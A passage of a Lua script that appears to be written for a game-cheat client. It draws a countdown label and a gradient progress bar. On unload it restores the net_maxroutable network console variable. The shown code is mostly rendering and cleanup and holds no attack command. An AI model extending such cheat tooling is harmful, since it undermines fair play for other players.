			local x = indicator_pos.x - (text_size.x / 2)

			local fraction = math.min(time_delta, 30) / 30
			local w = text_size.x * fraction;
			
			local color_from = Color.new(0.1, 0.88, 0.32, 1)
			local color_to = Color.new(map(fraction, 0, 1, 0.1, 1), map(fraction, 0, 1, 0.88, 0.25), map(fraction, 0, 1, 0.32, 0.25), 1)
			
			Render.Text(string.format(text, getTime(time_delta)), Vector2.new(x, indicator_pos.y + 20), Color.new(1.0, 1.0, 1.0, 1.0), 20)

			Render.GradientBoxFilled(Vector2.new(x, indicator_pos.y + 40), Vector2.new(x + w, indicator_pos.y + 55),
				color_from, color_to, color_from, color_to)
		end
	end

end)

--#endregion

Cheat.RegisterCallback("destroy", function()
	updateState(0, 0)
	cvar_setInt(cvar_net_maxroutable, 1200)
	cvar_setFloat(cvar_net_maxroutable, 1200)
	debug("unload")
end)